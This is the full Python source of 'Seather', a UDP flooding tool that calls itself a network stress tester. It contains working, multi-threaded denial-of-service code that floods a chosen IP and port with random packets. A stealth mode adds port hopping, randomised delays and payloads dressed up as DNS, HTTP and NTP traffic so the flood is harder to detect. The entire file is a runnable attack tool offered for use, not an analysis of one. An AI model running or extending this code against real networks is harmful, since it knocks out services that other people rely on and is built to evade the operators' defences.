#!/usr/bin/env python3
"""
Made by alchemy

This script is a high-performance UDP flooding tool designed for network stress testing.
It supports normal and stealth modes, multi-threading, real-time statistics, and protocol mimicry.

Before using this tool, please read the license terms carefully at:
https://github.com/zar7real/seather/blob/main/LICENSE
"""

import socket
import random
import time
import argparse
import threading
import sys
import statistics
from datetime import datetime

class UDPFlooder:
    def __init__(self, target_ip="192.168.1.255", port=9999, packet_size=1472, 
                 threads=1, duration=0, stealth=False, min_delay=0.1, max_delay=2.0):
        self.target_ip = target_ip
        self.port = port if not stealth else self.random_port()
        self.packet_size = packet_size if not stealth else random.randint(64, 2048)
        self.threads = threads
        self.duration = duration
        self.stealth = stealth
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.running = False
        self.sent_packets = 0
        self.start_time = 0
        self.pps_history = []
        self.connection_quality = "EXCELLENT"
        self.last_warning_time = 0
        self.operation_id = f"OP-{random.randint(10000, 99999)}"
        self.port_hopping_interval = 5  # seconds for port hopping
        self.last_port_change = time.time()
        
    def random_port(self):
        return random.randint(1024, 65535)
    
    def generate_stealth_payload(self):
        protocols = {
            'dns': b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00',
            'http': b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n',
            'ntp': b'\x1b' + random._urandom(47)
        }
        if random.random() > 0.7: 
            return random.choice(list(protocols.values()))
        return random._urandom(self.packet_size)
        
    def print_header(self):
        print("\033[34m")  # Blu
        print(" ███████╗███████╗ █████╗ ████████╗██╗  ██╗███████╗██████╗ ")
        print(" ██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║  ██║██╔════╝██╔══██╗")
        print(" ███████╗█████╗  ███████║   ██║   ███████║█████╗  ██████╔╝")
        print(" ╚════██║██╔══╝  ██╔══██║   ██║   ██╔══██║██╔══╝  ██╔══██╗")
        print(" ███████║███████╗██║  ██║   ██║   ██║  ██║███████╗██║  ██║")
        print(" ╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝")
        print("\033[0m")
        mode = "\033[32mSTEALTH\033[0m" if self.stealth else "\033[31mNORMAL\033[0m"
        print(f"\033[36mOPERATION ID: {self.operation_id} | MODE: {mode} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} \033[31m| Made by alchemy\033[0m")
        print("\033[90m" + "-" * 80 + "\033[0m")

        
    def flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    
        while self.running:
            try:
                if self.stealth:
                    current_time = time.time()
                    if current_time - self.last_port_change > self.port_hopping_interval:
                        self.port = self.random_port()
                        self.last_port_change = current_time
                
                    delay = random.uniform(self.min_delay, self.max_delay)
                    time.sleep(delay)

                    data = self.generate_stealth_payload()
                else:
                    data = random._urandom(self.packet_size)
            
                start_packet = time.time()
                sock.sendto(data, (self.target_ip, self.port))
                end_packet = time.time()
            
                send_time = (end_packet - start_packet) * 1000
                if send_time > 10:
                    self.check_connection_quality()
            
                self.sent_packets += 1
            except socket.error as e:
                self.log_error(f"NETWORK ERROR: {str(e)}", severity="HIGH")
                self.check_connection_quality()
                break
            except Exception as e:
                self.log_error(f"SYSTEM ERROR: {str(e)}", severity="CRITICAL")
                break
            
        sock.close()
    
    def log_error(self, message, severity="MEDIUM"):
        timestamp = datetime.now().strftime('%H:%M:%S')
        color = {"LOW": "\033[33m", "MEDIUM": "\033[93m", "HIGH": "\033[91m", "CRITICAL": "\033[41m\033[30m"}[severity]
        print(f"\n{color}[{timestamp}] {severity}: {message}\033[0m")
    
    def check_connection_quality(self):
        now = time.time()
        if now - self.last_warning_time < 5:
            return
            
        if len(self.pps_history) > 5:
            avg_pps = statistics.mean(self.pps_history[-5:])
            if len(self.pps_history) > 10:
                prev_avg = statistics.mean(self.pps_history[-10:-5])
                drop_percentage = (prev_avg - avg_pps) / prev_avg * 100
                
                if drop_percentage > 30:
                    self.connection_quality = "DEGRADED"
                    self.log_error(f"Throughput dropped by {drop_percentage:.1f}%", severity="HIGH")
                    self.last_warning_time = now
                elif drop_percentage > 15:
                    self.connection_quality = "STABLE"
                else:
                    self.connection_quality = "OPTIMAL"
    
    def start(self):
        self.print_header()
        print(f"\033[36mTARGET:\033[0m {self.target_ip}:{self.port}")
        print(f"\033[36mPAYLOAD:\033[0m {self.packet_size} bytes | Threads: {self.threads}")
        print(f"\033[36mDURATION:\033[0m {'CONTINUOUS' if self.duration == 0 else f'{self.duration}s'}")
        print("\033[90m" + "-" * 80 + "\033[0m")
        
        self.running = True
        self.start_time = time.time()
        threads = []
        
        for _ in range(self.threads):
            t = threading.Thread(target=self.flood)
            t.daemon = True
            t.start()
            threads.append(t)
        
        stats_thread = threading.Thread(target=self.show_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        try:
            if self.duration > 0:
                time.sleep(self.duration)
                self.stop()
            else:
                while True:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
        
        for t in threads:
            t.join()
    
    def stop(self):
        self.running = False
        elapsed = time.time() - self.start_time
        
        print("\n\033[90m" + "-" * 80 + "\033[0m")
        print("\033[34mOPERATION SUMMARY\033[0m")
        print("\033[90m" + "-" * 40 + "\033[0m")
        print(f"\033[36mOPERATION ID:\033[0m {self.operation_id}")
        print(f"\033[36mDURATION:\033[0m {elapsed:.2f}s")
        print(f"\033[36mTOTAL PACKETS:\033[0m {self.sent_packets}")
        print(f"\033[36mTHROUGHPUT:\033[0m {self.sent_packets/elapsed:.2f} pps")
        print(f"\033[36mFINAL STATUS:\033[0m {self.get_status_color()}{self.connection_quality}\033[0m")
        print("\033[90m" + "-" * 80 + "\033[0m")
        print("\033[34mOPERATION TERMINATED\033[0m\n")
    
    def get_status_color(self):
        return {
            "OPTIMAL": "\033[32m",  
            "STABLE": "\033[33m",   
            "DEGRADED": "\033[31m" 
        }.get(self.connection_quality, "\033[0m")
    
    def show_stats(self):
        last_count = 0
        last_time = time.time()
        
        while self.running:
            time.sleep(1)
            now = time.time()
            elapsed = now - last_time
            current_count = self.sent_packets
            
            if elapsed >= 1:
                pps = (current_count - last_count) / elapsed
                self.pps_history.append(pps)
                
                if len(self.pps_history) > 20:
                    self.pps_history.pop(0)
                
                status_color = self.get_status_color()
                sys.stdout.write(
                    f"\r\033[36mSTATUS:\033[0m {status_color}{self.connection_quality:<8}\033[0m | "
                    f"\033[36mPACKETS:\033[0m {current_count:<8} | "
                    f"\033[36mRATE:\033[0m {pps:.2f} pps | "
                    f"\033[36mTIME:\033[0m {time.time()-self.start_time:.1f}s"
                )
                sys.stdout.flush()
                last_count = current_count
                last_time = now

def get_args():
    parser = argparse.ArgumentParser(description="Network Assessment Tool", add_help=False)
    parser.add_argument("-i", "--ip", help="Target specification", default="192.168.1.255")
    parser.add_argument("-p", "--port", type=int, help="Port specification", default=9999)
    parser.add_argument("-s", "--size", type=int, help="Payload configuration", default=1472)
    parser.add_argument("-t", "--threads", type=int, help="Concurrency level", default=1)
    parser.add_argument("-d", "--duration", type=int, help="Operation duration", default=0)
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode")
    parser.add_argument("--min-delay", type=float, default=0.1, help="Minimum delay between packets in stealth mode")
    parser.add_argument("--max-delay", type=float, default=2.0, help="Maximum delay between packets in stealth mode")
    parser.add_argument("-h", "--help", action="help", help="Show this message")
    return parser.parse_args()

if __name__ == "__main__":
    args = get_args()
    flooder = UDPFlooder(
        target_ip=args.ip,
        port=args.port,
        packet_size=args.size,
        threads=args.threads,
        duration=args.duration,
        stealth=args.stealth,
        min_delay=args.min_delay,
        max_delay=args.max_delay
    )
    flooder.start()
